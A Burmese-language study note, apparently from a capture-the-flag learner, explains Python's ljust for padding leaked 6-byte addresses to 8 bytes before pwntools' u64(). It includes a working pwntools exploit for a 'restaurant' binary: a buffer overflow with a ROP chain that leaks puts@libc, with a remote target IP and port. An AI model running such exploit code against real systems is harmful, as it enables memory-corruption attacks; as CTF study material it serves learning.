
```python
.ljust(8, b"\x00")
```

ljsut ဆိုတာ ဘယ်ကိုသွားဖြည့်တာမဟုတ်ဘူး နဂိုရှိပြီးသားစာသားကို ဘယ်ကိုရောင်အောင် ညာဘက်ကနေ \0x00 ဖြည့်တာလို့ခေါ်တယ်
rjust ဆိုပြောင်းပြန် 

```python
print_f = p.recv(6).ljust(8, b"\x00")
print_f = u64(print_f) 
print(f"Leaked printf: {hex(print_f)}")
```


```python
from pwn import *

context.log_level = 'info'
context.binary = "./restaurant"
elf = context.binary

def start():
    if args.R:
        return remote("154.57.164.82", 32310)
    elif args.GDB:
        return gdb.debug(elf.path, gdbscript='''
            b *0x0000000000400e9d         
            continue
        ''')
    else:
        return process(elf.path)

def exploit(io):
    payload = b'A' * 40
    payload += p64(0x00000000004010a3)  # pop rdi; ret
    payload += p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])
    
    io.recvuntil(b"> ")
    io.sendline(b"1")
    io.recvuntil(b"> ")
    io.sendline(payload)
    io.recvuntil(b"Enjoy your ")
    io.recv(40)
    raw_data = io.recvline()
    
    # Extract the leaked address
    if b'\x7f' in raw_data:
        idx = raw_data.index(b'\x7f')
        leaked_bytes = raw_data[idx:idx+6]
    else:
        leaked_bytes = raw_data.strip()[:6]
    
    puts_libc = u64(leaked_bytes.ljust(8, b'\x00'))
    
    print("\n" + "="*40)
    print(f"[+] Leaked puts@libc address: {hex(puts_libc)}")
    print("="*40 + "\n")
    
    return puts_libc  # Return the leaked address

if __name__ == '__main__':
    io = start()
    leaked_puts = exploit(io)
    print(f"[+] Returned value: {hex(leaked_puts)}")
    io.interactive()

```


**`ljust`** ဆိုတာ Python ရဲ့ String သို့မဟုတ် Bytes တွေမှာ သုံးတဲ့ Built-in Method တစ်ခုဖြစ်ပြီး **"Left Justify" (ဘယ်ဘက်ကပ်ပြီး ညှိမယ်)** လို့ အဓိပ္ပာယ်ရပါတယ်။

သူ့ရဲ့ အဓိက အလုပ်ကတော့-

> "ငါပေးလိုက်တဲ့ Data ကို သတ်မှတ်ထားတဲ့ **အရှည် (Length)** ပြည့်အောင် ညာဘက်ကနေ **အဖြည့်စာသား (Padding)** တွေနဲ့ ဖြည့်ပေးပါ" လို့ ပြောတာပါ။

Binary exploitation (pwntools) မှာဆိုရင် `u32()` သို့မဟုတ် `u64()` နဲ့ address တွေကို unpack မလုပ်ခင် **Byte အရှည် ပြည့်အောင်** ဖြည့်တဲ့နေရာမှာ ၉၉ ရာခိုင်နှုန်း သုံးကြပါတယ်။

### ၁။ ရိုးရိုးရှင်းရှင်း သဘောတရားကို အရင်ကြည့်ရအောင် (Python Text)

Python

```
text = "hello"
# text ရဲ့ အရှည်ကို ၁၀ လုံးဖြစ်အောင် ညာဘက်ကနေ ကြယ်ပွင့် (*) တွေနဲ့ ဖြည့်မယ်
result = text.ljust(10, "*")

print(result)
# Output: hello*****
```

- `hello` က ၅ လုံးပဲ ရှိလို့ ၁၀ လုံးပြည့်အောင် ညာဘက်မှာ `*` ၅ လုံး အလိုအလျောက် ဖြည့်ပေးသွားတာပါ။
    

### ၂။ Binary Exploitation (Pwntools) မှာ ဘာကြောင့် မဖြစ်မနေ သုံးရသလဲ?

x64 (64-bit) architecture မှာ memory address တစ်ခုကို တကယ့် computer က ဖတ်ဖို့အတွက် **၈ ဘိုက် (8 bytes)** အပြည့် ရှိရပါမယ်။ (`u64()` function ကလည်း ၈ ဘိုက်အပြည့်ရှိမှ အလုပ်လုပ်တာပါ)။

ဒါပေမဲ့ တကယ့် လက်တွေ့မှာ `printf` ရဲ့ address တွေကို memory ကနေ leak လုပ်ပြီး `p.recv()` နဲ့ ဖတ်လိုက်တဲ့အခါ `0x7ffff7a01450` လိုမျိုး ထွက်လာတတ်ပါတယ်။

- အဲဒီ address ကို bytes အနေနဲ့ ကြည့်ရင် `\x50\x14\xa0\xf7\xff\x7f` ဆိုပြီး **၆ ဘိုက်** ပဲ ရှိတတ်ပါတယ်။ (ရှေ့က `\x00\x00` နှစ်ခုက မပါလာဘဲ ပျောက်နေတတ်လို့ပါ)။
    

တကယ်လို့ မင်းက ၆ ဘိုက်ပဲရှိတဲ့ data ကို `u64()` ထဲ တန်းထည့်ရင် pwntools က အခုလို အော်ပြီး Error တက်ပါလိမ့်မယ်-

> `PwnlibException: Pwntools unpack expects 8 bytes, got 6`

### ၃။ `ljust(8, b'\x00')` ဘယ်လို ကယ်တင်သလဲ?

ဒီ ပြဿနာကို ဖြေရှင်းဖို့ `ljust(8, b'\x00')` ကို သုံးရပါတယ်။

Python

```python
# ကွန်ပျူတာဆီကနေ leak ရလာတဲ့ ၆ ဘိုက်ပဲရှိတဲ့ address စာသား
leaked_bytes = b"\x50\x14\xa0\xf7\xff\x7f" 

# ၈ ဘိုက်ပြည့်အောင် ညာဘက်ကနေ Null byte (\x00) တွေနဲ့ ဖြည့်ခိုင်းလိုက်တယ်
perfect_bytes = leaked_bytes.ljust(8, b"\x00")

print(perfect_bytes)
# Output: b'\x50\x14\xa0\xf7\xff\x7f\x00\x00'  <-- ၈ ဘိုက် အပြည့်ဖြစ်သွားပြီ!

# အခုဆို u64() နဲ့ အဆင်ပြေပြေ ပြောင်းလို့ရပါပြီ
address = u64(perfect_bytes)
```

### 💡 မှတ်သားရန်အချက်

- x64 Binary တွေအတွက်ဆိုရင် ၈ ဘိုက် ပြည့်ရမှာမလို့ `ljust(8, b'\x00')` သုံးရပါတယ်။
    
- x86 (32-bit) Binary တွေအတွက်ဆိုရင်တော့ ၄ ဘိုက် ပြည့်ရမှာမလို့ `ljust(4, b'\x00')` သုံးပေးရပါတယ်။
    

မင်းရဲ့ exploit script မှာ `p.recv()` နောက်ကနေ `.ljust(8, b'\x00')` လေး ထည့်ပေးလိုက်ရင် စောစောက ကြုံရတဲ့ `u64` data byte မပြည့်တဲ့ပြဿနာ ဝေးဝေးပြေးသွားပါလိမ့်မယ်!